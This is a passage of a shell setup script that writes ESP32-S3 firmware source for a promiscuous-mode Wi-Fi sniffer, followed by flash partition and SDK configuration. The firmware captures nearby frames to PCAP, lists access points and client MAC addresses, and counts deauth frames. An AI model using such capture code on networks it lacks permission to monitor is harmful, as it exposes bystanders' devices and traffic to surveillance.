                if (pcap_ring_is_active()) pcap_ring_store(msg.payload, msg.len, &msg.tv);
                heap_caps_free(msg.payload);
            }
        }
    }
}

static void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!buf || !g_wifi_pkt_queue) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    size_t len = pkt->rx_ctrl.sig_len;
    if (len == 0 || len > WIFI_MAX_PAYLOAD) return;

    uint8_t *payload_copy = heap_caps_malloc(len, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!payload_copy) { atomic_inc_u32(&g_wifi_alloc_drop); return; }

    memcpy(payload_copy, pkt->payload, len);
    wifi_pkt_msg_t msg = {
        .payload = payload_copy, .len = len, .rssi = pkt->rx_ctrl.rssi,
        .channel = pkt->rx_ctrl.channel, .tv = {0}
    };
    gettimeofday(&msg.tv, NULL);

    if (xQueueSend(g_wifi_pkt_queue, &msg, 0) != pdTRUE) {
        heap_caps_free(payload_copy);
        atomic_inc_u32(&g_wifi_queue_drop);
    }
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */
static void wifi_clear_state_locked(void) {
    g_ap_count = 0; g_client_count = 0;
    memset(g_ap_list, 0, sizeof(g_ap_list));
    memset(g_client_list, 0, sizeof(g_client_list));
    memset(&g_wifi_stats, 0, sizeof(g_wifi_stats));
}

static esp_err_t wifi_sniffer_start_internal(uint32_t duration_sec, bool enable_pcap) {
    if (!atomic_load(&g_wifi_init_done) || atomic_load(&g_wifi_sniffer_active)) return ESP_ERR_INVALID_STATE;
    if (enable_pcap) {
        esp_err_t pcap_ret = pcap_open();
        if (pcap_ret != ESP_OK) return pcap_ret;
    }
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    wifi_clear_state_locked();
    xSemaphoreGive(g_wifi_lock);

    atomic_store(&g_wifi_sniffer_active, true);
    esp_err_t ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK) {
        atomic_store(&g_wifi_sniffer_active, false);
        if (enable_pcap) pcap_close();
        return ret;
    }
    led_set_state(LED_STATE_SCANNING);
    if (duration_sec > 0 && g_sniff_timer != NULL) {
        esp_timer_stop(g_sniff_timer);
        esp_timer_start_once(g_sniff_timer, (uint64_t)duration_sec * 1000000ULL);
    }
    if (channel_hopper_init() == ESP_OK) {
        ch_hop_config_t cfg = { .mode = CH_HOP_MODE_SEQUENTIAL, .dwell_ms = 100, .channel_mask = 0xFF };
        channel_hopper_start(&cfg);
    }
    ESP_LOGI(TAG, "Wi-Fi sniffer started, duration=%" PRIu32 " s", duration_sec);
    return ESP_OK;
}

esp_err_t wifi_sniffer_init(void) {
    if (atomic_load(&g_wifi_init_done)) return ESP_OK;
    if (!g_wifi_lock) g_wifi_lock = xSemaphoreCreateMutex();
    if (!g_pcap_mutex) g_pcap_mutex = xSemaphoreCreateMutex();
    if (!g_wifi_pkt_queue) g_wifi_pkt_queue = xQueueCreate(WIFI_QUEUE_LEN, sizeof(wifi_pkt_msg_t));
    if (!g_wifi_lock || !g_pcap_mutex || !g_wifi_pkt_queue) return ESP_ERR_NO_MEM;

    if (xTaskCreatePinnedToCore(wifi_pkt_worker_task, "wifi_worker", 6144, NULL, 5, NULL, 1) != pdPASS) return ESP_FAIL;

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) return ret;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE);

    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_cb);

    if (g_sniff_timer == NULL) {
        esp_timer_create_args_t targs = {
            .callback = sniff_timer_cb,
            .arg = NULL,
            .name = "wifi_sniff_tmr"
        };
        esp_timer_create(&targs, &g_sniff_timer);
    }

    atomic_store(&g_wifi_init_done, true);
    ESP_LOGI(TAG, "Wi-Fi sniffer initialized");
    return ESP_OK;
}

esp_err_t wifi_sniffer_start(uint32_t duration_sec) { return wifi_sniffer_start_internal(duration_sec, false); }
esp_err_t wifi_sniffer_start_pcap(uint32_t duration_sec) { return wifi_sniffer_start_internal(duration_sec, true); }

void wifi_sniffer_stop(void) {
    if (!atomic_load(&g_wifi_sniffer_active)) return;
    atomic_store(&g_wifi_sniffer_active, false);
    if (g_sniff_timer != NULL) esp_timer_stop(g_sniff_timer);
    esp_wifi_set_promiscuous(false);
    wifi_pkt_msg_t msg;
    while (xQueueReceive(g_wifi_pkt_queue, &msg, pdMS_TO_TICKS(5)) == pdTRUE) {
        if (msg.payload) heap_caps_free(msg.payload);
    }
    if (atomic_load(&g_pcap_active)) pcap_close();
    channel_hopper_stop();
    led_set_state(LED_STATE_IDLE);
    ESP_LOGI(TAG, "Wi-Fi sniffer stopped");
}

bool wifi_sniffer_is_active(void) { return atomic_load(&g_wifi_sniffer_active); }
void wifi_sniffer_clear_fixed_channel(void) { atomic_store(&g_wifi_fixed_channel, 0); }

/* -------------------------------------------------------------------------
 *  Printers
 * ----------------------------------------------------------------------- */
static void wifi_stats_fprint(FILE *out) {
    if (!out || !g_wifi_lock) return;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    fprintf(out, "\n==================== WI-FI STATS ====================\n");
    fprintf(out, "Management frames : %" PRIu32 "\n", g_wifi_stats.total_mgmt);
    fprintf(out, "Data frames       : %" PRIu32 "\n", g_wifi_stats.total_data);
    fprintf(out, "Beacons           : %" PRIu32 "\n", g_wifi_stats.beacon);
    fprintf(out, "Probe Requests    : %" PRIu32 "\n", g_wifi_stats.probe_req);
    fprintf(out, "Probe Responses   : %" PRIu32 "\n", g_wifi_stats.probe_resp);
    fprintf(out, "Deauth frames     : %" PRIu32 "\n", g_wifi_stats.deauth);
    fprintf(out, "Disassoc frames   : %" PRIu32 "\n", g_wifi_stats.disassoc);
    xSemaphoreGive(g_wifi_lock);
    fprintf(out, "Alloc drops       : %" PRIu32 "\n", atomic_load_u32(&g_wifi_alloc_drop));
    fprintf(out, "Queue drops       : %" PRIu32 "\n", atomic_load_u32(&g_wifi_queue_drop));
    if (atomic_load(&g_pcap_active)) fprintf(out, "Active PCAP       : %s\n", g_pcap_path);
    fprintf(out, "=====================================================\n");
}

void wifi_sniffer_fprint(FILE *out) {
    if (!out || !g_wifi_lock) return;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    fprintf(out, "\n=============================================================\n");
    fprintf(out, "                  DISCOVERED ACCESS POINTS (%d)\n", g_ap_count);
    fprintf(out, "=============================================================\n");
    fprintf(out, " #  | BSSID             | CH | RSSI | PKTS     | PMF       | RRM/BTM | NBR | MBSSID | HE  | CC  | SSID\n");
    fprintf(out, "----+-------------------+----+------+----------+-----------+---------+-----+--------+-----+-----+-----------------\n");
    for (int i = 0; i < g_ap_count; i++) {
        const char *pmf_str = "no";
        if (g_ap_list[i].pmf_capable) pmf_str = g_ap_list[i].pmf_required ? "REQ" : "CAP";
        char rrm_btm[8] = "-";
        if (g_ap_list[i].has_rrm && g_ap_list[i].has_btm) snprintf(rrm_btm, sizeof(rrm_btm), "KV");
        else if (g_ap_list[i].has_rrm) snprintf(rrm_btm, sizeof(rrm_btm), "K");
        else if (g_ap_list[i].has_btm) snprintf(rrm_btm, sizeof(rrm_btm), "V");
        char mbssid[8] = "-";
        if (g_ap_list[i].is_multi_bssid) snprintf(mbssid, sizeof(mbssid), "%s/%d", g_ap_list[i].is_transmitted_bssid ? "TX" : "NON", g_ap_list[i].bssid_index);
        char he[8] = "-";
        if (g_ap_list[i].he_capable) {
            uint8_t nss = g_ap_list[i].he_mcs_nss & 0x0F;
            if (g_ap_list[i].he_ppdu_type == 1) snprintf(he, sizeof(he), "MU-%d", nss);
            else if (g_ap_list[i].he_ppdu_type == 2) snprintf(he, sizeof(he), "SU-%d", nss);
            else snprintf(he, sizeof(he), "%dSS", nss);
        }
        const char *cc = g_ap_list[i].regdom_present ? g_ap_list[i].country_code : "-";
        fprintf(out, "%-2d | %02X:%02X:%02X:%02X:%02X:%02X | %-2d | %-4d | %-8" PRIu32 " | %-9s | %-7s | %-3d | %-6s | %-4s | %-3s | %s\n",
                i + 1, g_ap_list[i].bssid[0], g_ap_list[i].bssid[1], g_ap_list[i].bssid[2], g_ap_list[i].bssid[3], g_ap_list[i].bssid[4], g_ap_list[i].bssid[5],
                g_ap_list[i].channel, g_ap_list[i].rssi, g_ap_list[i].pkt_count, pmf_str, rrm_btm, g_ap_list[i].neighbor_count, mbssid, he, cc, g_ap_list[i].ssid);
    }
    fprintf(out, "\n=============================================================\n");
    fprintf(out, "                  DISCOVERED CLIENT DEVICES (%d)\n", g_client_count);
    fprintf(out, "=============================================================\n");
    fprintf(out, " #  | CLIENT MAC        | CH | RSSI | PKTS     | CONNECTED TO BSSID\n");
    fprintf(out, "----+-------------------+----+------+----------+-------------------\n");
    for (int i = 0; i < g_client_count; i++) {
        fprintf(out, "%-2d | %02X:%02X:%02X:%02X:%02X:%02X | %-2d | %-4d | %-8" PRIu32 " | %02X:%02X:%02X:%02X:%02X:%02X\n",
                i + 1, g_client_list[i].mac[0], g_client_list[i].mac[1], g_client_list[i].mac[2], g_client_list[i].mac[3], g_client_list[i].mac[4], g_client_list[i].mac[5],
                g_client_list[i].channel, g_client_list[i].rssi, g_client_list[i].pkt_count,
                g_client_list[i].ap_bssid[0], g_client_list[i].ap_bssid[1], g_client_list[i].ap_bssid[2], g_client_list[i].ap_bssid[3], g_client_list[i].ap_bssid[4], g_client_list[i].ap_bssid[5]);
    }
    fprintf(out, "=============================================================\n");
    xSemaphoreGive(g_wifi_lock);
}

void wifi_sniffer_print_results(void) { wifi_sniffer_fprint(stdout); }
void wifi_sniffer_print_stats(void) { wifi_stats_fprint(stdout); }

esp_err_t wifi_sniffer_save_report(const char *path) {
    if (!path) return ESP_ERR_INVALID_ARG;
    FILE *f = fopen(path, "w");
    if (!f) return ESP_FAIL;
    wifi_sniffer_fprint(f);
    wifi_stats_fprint(f);
    fclose(f);
    return ESP_OK;
}

void wifi_sniffer_print_clients_of_ap(const uint8_t *bssid) {
    if (!bssid || !g_wifi_lock) return;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    char ssid[33] = {0};
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            snprintf(ssid, sizeof(ssid), "%s", g_ap_list[i].ssid); break;
        }
    }
    printf("\nClients of %02X:%02X:%02X:%02X:%02X:%02X (%s):\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid[0] ? ssid : "?");
    printf("----+-------------------+----+------+----------\n");
    int n = 0;
    for (int i = 0; i < g_client_count; i++) {
        if (memcmp(g_client_list[i].ap_bssid, bssid, 6) == 0) {
            n++;
            printf("%-2d | %02X:%02X:%02X:%02X:%02X:%02X | %-2d | %-4d | %"PRIu32"\n", n,
                   g_client_list[i].mac[0], g_client_list[i].mac[1], g_client_list[i].mac[2], g_client_list[i].mac[3], g_client_list[i].mac[4], g_client_list[i].mac[5],
                   g_client_list[i].channel, g_client_list[i].rssi, g_client_list[i].pkt_count);
        }
    }
    if (n == 0) printf("(none)\n");
    xSemaphoreGive(g_wifi_lock);
}



esp_err_t wifi_sniffer_get_ap(uint16_t index, ap_info_t *out)
{
    if (out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_wifi_lock == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);

    if (index >= g_ap_count) {
        xSemaphoreGive(g_wifi_lock);
        return ESP_ERR_NOT_FOUND;
    }

    *out = g_ap_list[index];

    xSemaphoreGive(g_wifi_lock);

    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/wifi_sniffer.c"

# ============================================================================
#  Partition Table & SDK Configuration for ESP32-S3-N16R8 (16 MB Flash / 8 MB PSRAM)
# ============================================================================
cat << EOF_PARTITIONS > "${PROJECT_ROOT}/partitions.csv"
# Name,   Type, SubType, Offset,   Size,     Flags
nvs,      data, nvs,     0x9000,   0x6000,
otadata,  data, ota,     0xf000,   0x2000,
phy_init, data, phy,     0x11000,  0x1000,
factory,  app,  factory, 0x20000,  0x300000,
ota_0,    app,  ota_0,   0x320000, 0x300000,
ota_1,    app,  ota_1,   0x620000, 0x300000,
spiffs,   data, spiffs,  0x920000, 0x500000,
EOF_PARTITIONS
echo "  Created ${PROJECT_ROOT}/partitions.csv (3 MB factory/OTA slots + 5 MiB SPIFFS)"

update_kconfig_file() {
    local cfg_file="$1"
    touch "${cfg_file}"
    sed -i \
        -e "/^CONFIG_IDF_TARGET=/d" \
        -e "/^CONFIG_IDF_TARGET_ESP32=/d" \
        -e "/^CONFIG_IDF_TARGET_ESP32S3=/d" \
        -e "/^CONFIG_ESPTOOLPY_FLASHSIZE_/d" \
        -e "/^CONFIG_PARTITION_TABLE_/d" \
        -e "/^CONFIG_COMPILER_OPTIMIZATION_/d" \
        -e "/^CONFIG_SPIRAM=/d" \
        -e "/^CONFIG_SPIRAM_MODE_/d" \
        -e "/^CONFIG_SPIRAM_SPEED_/d" \
        "${cfg_file}"
    cat << EOF_KCONFIG >> "${cfg_file}"
CONFIG_IDF_TARGET="esp32s3"
CONFIG_IDF_TARGET_ESP32S3=y
CONFIG_ESPTOOLPY_FLASHSIZE_16MB=y
CONFIG_ESPTOOLPY_FLASHSIZE="16MB"
CONFIG_PARTITION_TABLE_CUSTOM=y
CONFIG_PARTITION_TABLE_CUSTOM_FILENAME="partitions.csv"
CONFIG_PARTITION_TABLE_FILENAME="partitions.csv"
CONFIG_PARTITION_TABLE_OFFSET=0x8000
CONFIG_PARTITION_TABLE_MD5=y
CONFIG_COMPILER_OPTIMIZATION_SIZE=y
CONFIG_SPIRAM=y
CONFIG_SPIRAM_MODE_OCT=y
CONFIG_SPIRAM_SPEED_80M=y
EOF_KCONFIG
}

update_kconfig_file "${PROJECT_ROOT}/sdkconfig.defaults"
echo "  Updated ${PROJECT_ROOT}/sdkconfig.defaults (target=esp32s3, 16MB flash, 8MB Octal PSRAM, custom partitions)"

# If build directory is currently configured for esp32 instead of esp32s3, switch target
if [ -f "${PROJECT_ROOT}/sdkconfig" ] && grep -q 'CONFIG_IDF_TARGET="esp32"' "${PROJECT_ROOT}/sdkconfig" 2>/dev/null; then
    echo "  Detected old target 'esp32' in sdkconfig — removing stale sdkconfig and build/ so esp32s3 target takes effect..."
    rm -f "${PROJECT_ROOT}/sdkconfig" "${PROJECT_ROOT}/sdkconfig.old"
    rm -rf "${PROJECT_ROOT}/build"
elif [ -f "${PROJECT_ROOT}/sdkconfig" ]; then
    update_kconfig_file "${PROJECT_ROOT}/sdkconfig"
    echo "  Updated ${PROJECT_ROOT}/sdkconfig"
fi

echo ""
echo "All ESP-IDF v6.1 fixes applied! Run:"
echo "  idf.py set-target esp32s3   # (if not already set to esp32s3)"
echo "  bash apply_reaper_fixes.sh  # (ensures sdkconfig has 16MB flash & partitions.csv)"
echo "  idf.py flash monitor"